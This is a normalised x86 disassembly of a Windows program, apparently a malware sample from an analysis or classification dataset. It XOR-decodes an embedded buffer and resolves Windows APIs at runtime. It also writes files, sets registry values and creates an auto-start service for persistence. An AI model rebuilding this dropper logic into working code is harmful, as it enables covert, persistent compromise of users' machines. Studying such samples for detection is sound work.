sub_401000
push ebp
mov ebp esp
sub esp 0x18
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx edx
mov eax edx
mov [ ebp - 0x18 ] ecx
push ebx
shr eax 0x3
shr ecx 0x3
push esi
mov esi [ ebp + 0x14 ]
cmp eax ecx
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ecx
jae r-xdata
mov ecx eax
and edx 0x7
sub ecx [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
not ecx
and ecx edx
mov edx [ ebp - 0x18 ]
and edx 0x7
cmp ecx edx
mov [ ebp + 0x10 ] edx
jae r-xdata
mov [ ebp + 0x14 ] edx
and [ ebp + 0x14 ] 0x7
pop edi
pop esi
pop ebx
leave
retn 0x10
mov [ ebp + 0xf ] al
mov edx eax
shl [ ebp + 0xf ] 0x3
mov eax [ ebp + 0x8 ]
lea edi [ ecx + 0x2 ]
shl edx 0x3
mov [ ebp - 0x4 ] edx
lea eax [ edx + eax - 0x2 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc eax
cmp eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jb r-xdata
mov [ ebp + 0xf ] al
mov edx eax
shl [ ebp + 0xf ] 0x3
mov eax [ ebp + 0x8 ]
lea edi [ ecx + 0x2 ]
shl edx 0x3
mov [ ebp - 0x4 ] edx
lea eax [ eax + edx - 0x2 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov bl [ ebp + 0xf ]
lea eax [ edi + 0x1 ]
and eax 0x7
add bl cl
mov al [ eax + esi ]
imul bl
mov bl al
mov eax edi
and eax 0x7
or bl [ eax + esi ]
movzx eax [ edi + esi - 0x2 ]
add eax edx
add eax ecx
shr eax cl
xor bl al
lea eax [ edi - 0x1 ]
and eax 0x7
xor bl [ eax + esi ]
mov eax [ ebp - 0x8 ]
xor [ edi + eax ] bl
inc ecx
inc edi
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov ecx eax
sub ecx [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
not ecx
and ecx [ ebp + 0x14 ]
cmp ecx 0x8
jae r-xdata
mov bl [ ebp + 0xf ]
lea eax [ edi + 0x1 ]
and eax 0x7
add bl cl
mov al [ eax + esi ]
imul bl
mov bl al
mov eax edi
and eax 0x7
or bl [ eax + esi ]
movzx eax [ esi + edi - 0x2 ]
add eax edx
add eax ecx
shr eax cl
xor bl al
lea eax [ edi - 0x1 ]
and eax 0x7
xor bl [ eax + esi ]
mov eax [ ebp - 0x8 ]
xor [ eax + edi ] bl
inc ecx
inc edi
cmp edi 0xa
jl r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp + 0x10 ]
sub_401139
push ebp
mov ebp esp
sub esp 0x118
push ebx
push esi
push edi
mov edi 0x104
xor ebx ebx
push edi
lea eax [ ebp - 0x118 ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
call [ rw-data ]
add esp 0xc
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0xc ] eax
push rw-data
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call [ rw-data ]
mov esi [ GetProcAddress@IAT ]
add esp 0xc
push rw-data
push [ ebp - 0xc ]
call esi
push rw-data
mov [ ebp - 0x14 ] eax
push [ ebp - 0xc ]
call esi
push rw-data
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
call esi
cmp [ rw-data ] 0x6
mov [ ebp - 0x10 ] eax
jae r-xdata
push edi
lea eax [ ebp - 0x118 ]
push ebx
push eax
call [ rw-data ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call [ rw-data ]
add esp 0x18
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000001
call [ ebp - 0x14 ]
mov esi eax
cmp esi ebx
jne r-xdata
push [ ebp + 0x8 ]
call sub_401727
test eax eax
jne r-xdata
xor eax eax
cmp esi ebx
sete al
lea eax [ ebp - 0x118 ]
push edi
push eax
push 0x1
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x8 ]
push [ ebp - 0x4 ]
mov esi eax
call [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
push 0x80000002
push rw-data
push [ ebp - 0xc ]
call esi
call eax
cmp eax ebx
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push edi
push [ ebp + 0x8 ]
push 0x1
push ebx
push ebx
push [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov esi eax
cmp esi ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
cmp esi ebx
je r-xdata
push edi
push rw-data
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov esi eax
cmp esi ebx
jne r-xdata
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000002
call [ ebp - 0x14 ]
mov esi eax
cmp esi ebx
jne r-xdata
push edi
push rw-data
push 0x1
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov esi eax
sub_4012c8
push ebp
mov ebp esp
sub esp 0x114
push esi
lea eax [ ebp - 0x114 ]
push 0x104
push eax
call [ rw-data ]
lea eax [ ebp - 0x114 ]
push rw-data
push eax
call [ rw-data ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
lea eax [ ebp - 0x114 ]
push 0x80000000
push eax
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
push esi
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push esi
call [ rw-data ]
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push [ rw-data ]
call esi
call eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push [ rw-data ]
call esi
call eax
jmp r-xdata
pop esi
leave
retn 0x4
sub_401374
push ebx
push esi
push edi
mov edi [ LoadLibraryA@IAT ]
push rw-data
call edi
mov esi [ GetProcAddress@IAT ]
push rw-data
push eax
mov [ rw-data ] eax
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
mov ebx rw-data
push rw-data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push rw-data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
retn
sub_4013fb
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
xor edi edi
push 0x104
lea eax [ ebp - 0x10c ]
push edi
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ rw-data ]
mov ebx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x10c ]
push ebx
push eax
call [ rw-data ]
push rw-data
push ebx
call [ rw-data ]
mov esi [ GetProcAddress@IAT ]
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
cmp eax 0xffffffff
je r-xdata
push rw-data
push ebx
call [ fopen@IAT ]
pop ecx
cmp eax edi
pop ecx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call [ rw-data ]
lea eax [ ebp - 0x10c ]
push 0x1
push eax
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
push [ eax + 0x10 ]
call [ _get_osfhandle@IAT ]
mov edi eax
pop ecx
cmp edi 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call [ fclose@IAT ]
pop ecx
lea eax [ ebp - 0x8 ]
push 0x0
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push rw-data
push [ rw-data ]
call esi
call eax
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x14 ]
push edi
push rw-data
push [ rw-data ]
call esi
call eax
push edi
call [ rw-data ]
push rw-data
push ebx
call sub_401139
mov [ ebp - 0x4 ] eax
sub_40150b
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x10b ]
mov [ ebp - 0x10c ] bl
mov esi 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
push esi
lea eax [ ebp - 0x10c ]
push ebx
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
call sub_4012c8
cmp [ rw-data ] 0x6
jae r-xdata
push esi
lea eax [ ebp - 0x10c ]
push ebx
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x10c ]
push eax
push ebx
push ebx
push 0x801c
push ebx
push rw-data
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
call eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4013fb
neg eax
sbb eax eax
neg eax
lea eax [ ebp - 0x10c ]
push esi
push eax
call [ rw-data ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4013fb
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4015e2
push ebp
mov ebp esp
sub esp 0x120
push ebx
push esi
push edi
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] 0xd1
mov [ ebp - 0xb ] 0xa6
mov [ ebp - 0xa ] 0xb8
mov [ ebp - 0x9 ] 0x14
mov [ ebp - 0x8 ] 0x36
mov [ ebp - 0x7 ] 0x28
mov [ ebp - 0x6 ] 0x9e
mov [ ebp - 0x5 ] 0x8a
mov [ ebp - 0x120 ] 0x54af97e1
movd mmx0 [ ebp - 0x120 ]
pslld mmx0 0x2
movd [ ebp - 0x120 ] mmx0
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x27a
push rw-data
call sub_401000
call sub_401374
call [ GetVersion@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xffff
movzx eax ax
and eax 0xff
movzx eax al
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xffff
movzx eax ax
shr eax 0x8
movzx eax al
mov [ rw-data ] eax
push rw-data
push 0x11c
push 0x0
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x14 ] eax
push [ ebp - 0x14 ]
push 0x0
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x14 ]
push 0x0
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
call sub_401000
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
call sub_40150b
pop edi
pop esi
pop ebx
leave
retn 0x10
sub_401727
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x634
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x224 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x104
push esi
lea eax [ ebp - 0x220 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x220 ]
push eax
call [ GetSystemDirectoryW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push rw-data
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
push 0x2
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x228 ] eax
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x220 ]
push ecx
push 0x1
push 0x2
push 0x110
push 0xf01ff
mov esi rw-data
push esi
push esi
push eax
call [ CreateServiceW@IAT ]
mov [ ebp - 0x224 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x634 ] rw-data
lea ecx [ ebp - 0x634 ]
push ecx
push 0x1
push eax
call [ ChangeServiceConfig2A@IAT ]
mov [ ebp - 0x644 ] ebx
lea eax [ ebp - 0x644 ]
push eax
push rw-data
push 0x80000002
mov edi [ RegCreateKeyW@IAT ]
call edi
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
mov ebx eax
mov [ ebp - 0x230 ] 0x1
push 0x4
lea eax [ ebp - 0x230 ]
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x644 ]
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x644 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x644 ]
push eax
push rw-data
push 0x80000002
call edi
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x63c ] ebx
lea eax [ ebp - 0x63c ]
push eax
push rw-data
push [ ebp - 0x644 ]
call edi
mov [ ebp - 0x230 ] eax
push [ ebp - 0x644 ]
call [ RegCloseKey@IAT ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
push 0x2
push ebx
push rw-data
push [ ebp - 0x63c ]
call [ RegSetValueExA@IAT ]
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x640 ] 0x1
push 0x4
lea eax [ ebp - 0x640 ]
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x63c ]
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x63c ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x644 ]
push eax
push rw-data
push 0x80000002
call edi
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x630 ] bl
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x62f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x638 ] 0x400
push esi
mov edi [ lstrlenW@IAT ]
call edi
shl eax 0x1
push eax
push esi
lea eax [ ebp - 0x630 ]
push eax
call memcpy
add esp 0xc
push esi
call edi
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x638 ] eax
push eax
lea eax [ ebp - 0x630 ]
push eax
push 0x7
push ebx
push rw-data
push [ ebp - 0x644 ]
call [ RegSetValueExW@IAT ]
mov [ ebp - 0x230 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x644 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
mov eax ebx
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401bc1
cmp [ rw-data ] ebx
jne r-xdata
call sub_401bac
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401bbe
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4015e2
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4019f8
xor ebx ebx
cmp [ ebp - 0x224 ] ebx
je r-xdata
cmp [ ebp - 0x228 ] ebx
je r-xdata
push [ ebp - 0x224 ]
call [ CloseServiceHandle@IAT ]
retn
push [ ebp - 0x228 ]
call [ CloseServiceHandle@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
_local_unwind2
jmp [ _local_unwind2@IAT ]
memcpy
jmp [ memcpy@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401bac
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401bbe
xor eax eax
retn
sub_401bc1
retn
_controlfp
jmp [ _controlfp@IAT ]
